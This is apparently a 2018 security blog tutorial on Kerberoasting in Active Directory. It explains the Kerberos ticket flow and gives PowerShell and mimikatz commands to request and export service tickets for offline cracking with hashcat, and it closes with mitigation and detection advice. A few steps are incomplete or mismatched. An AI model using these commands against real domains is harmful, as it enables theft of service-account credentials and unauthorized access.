---
layout: single
title: 2018-08-28 kerberoasting
modified:
categories: blog
date: 2018-08-28T08:08:50-04:00
---

# Kerberoasting!
Lets talk about some old security here. Kerberos! This is a couple years old but sadly still works. Kerberos is the authentication system for windows and ad networks. There is an exploit that allows us to get back a poorly encrypted hash of valuable logins all directly from the domain controller, this is done once you have an authenticated user, so it isn't the main way in but once you have a foothold you can pivot to a more useful account. Lets have a brief breakdown of how kerberos works, borrowed from https://adsecurity.org/?p=3458

User logs on with username & password.
1a. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC as an authenticator in the authentication ticket (TGT) request (AS-REQ).
1b. The Domain Controller (KDC) checks user information (logon restrictions, group membership, etc) & creates Ticket-Granting Ticket (TGT).
2. The TGT is encrypted, signed, & delivered to the user (AS-REP). Only the Kerberos service (KRBTGT) in the domain can open and read TGT data.
3. The User presents the TGT to the DC when requesting a Ticket Granting Service (TGS) ticket (TGS-REQ). The DC opens the TGT & validates PAC checksum - If the DC can open the ticket & the checksum check out, TGT = valid. The data in the TGT is effectively copied to create the TGS ticket.
4. The TGS is encrypted using the target service accounts' NTLM password hash and sent to the user (TGS-REP).
5.The user connects to the server hosting the service on the appropriate port & presents the TGS (AP-REQ). The service opens the TGS ticket using its NTLM password hash.
6. If mutual authentication is required by the client (think MS15–011: the Group Policy patch from February that added UNC hardening).
Unless PAC validation is required (rare), the service accepts all data in the TGS ticket with no communication to the DC.
Alright so lets just dive right in to the nitty gritty here. We are going to do this on a windows box with powershell and the active directory module.
The return will look something like "MSSQLSvc/adsmsDB01.adsecurity.org:1433", then "MSSQLSvc" is the SPN type. The SPN is really the important part of the initial scan because we will want to find specific types of SPNs. Such as:
AGPMServer: Often has full control rights to all GPOs.
MSSQL/MSSQLSvc: Admin rights to SQL server(s) which often has interesting data.
FIMService: Often has admin rights to multiple AD forests.
STS: VMWare SSO service which could provide backdoor VMWare access.
To do the actual querying we can use the Get-ADUser cmdlet:
```
get-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate
```
We can also use PowerView's Get-NetUser cmdlet:
```
Get-NetUser -AdminCount | Select name,whencreated,pwdlastset,lastlogon
```
Once we have an SPN then lets get the querying for the vulnerable hash type
```
$SPNName = 'MSSQLSvc/adsmsDB01.adsecurity.org:1433'
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```
We can then use "$ klist "in order to get the listing of the hash and from there we can use mimikatz in order to export.

```$ mimikatz 
$ kerberos::list /export```
Then we just drop that hash into hashcat with a word list and we are good to go.
Sadly this vulnerability is over 4 years old, it is still out there. In order to mitigate it the recommendation is ensuring service account passwords are longer than 25 characters (and aren't easily guessable). Also enabling logging and then dropping that log information into a SIEM where you can look for specific "4769 events" and and Ticket_Encryption_Type= : 0x17. Good luck!
links:
https://adsecurity.org/?p=2293 : "Cracking Kerberos TGS Tickets Using Kerberoast - Exploiting Kerberos to Compromise the Active Directory Domain"
https://adsecurity.org/?p=3466 : "Sneaky Persistence Active Directory Trick #18: Dropping SPNs on Admin Accounts for Later Kerberoasting."